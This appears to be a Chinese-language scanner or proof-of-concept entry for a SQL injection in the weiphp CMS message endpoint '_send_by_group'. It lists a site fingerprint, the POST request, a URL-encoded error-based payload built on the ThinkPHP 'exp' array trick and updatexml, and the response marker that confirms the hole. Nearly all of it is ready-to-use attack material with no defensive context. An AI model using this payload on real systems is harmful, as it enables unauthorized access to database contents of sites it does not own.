# weiphpcms_send_by_groupsql注入漏洞

weiphpcms_send_by_groupsql ｜ SQL注入 ｜ —
- **指纹**：`body="/css/weiphp.css"`
- **请求**：`POST /public/index.php/weixin/message/_send_by_group HTTP/1.1`

**Payload**
```
group_id[0]=exp&group_id[1]=%29+and+updatexml%281%2Cconcat%280x7e%2C%28%2F%2A%2150000select%2A%2F+123456ww%29%2C0x7e%29%2C1%29+--
```
- **响应特征**：500 123456ww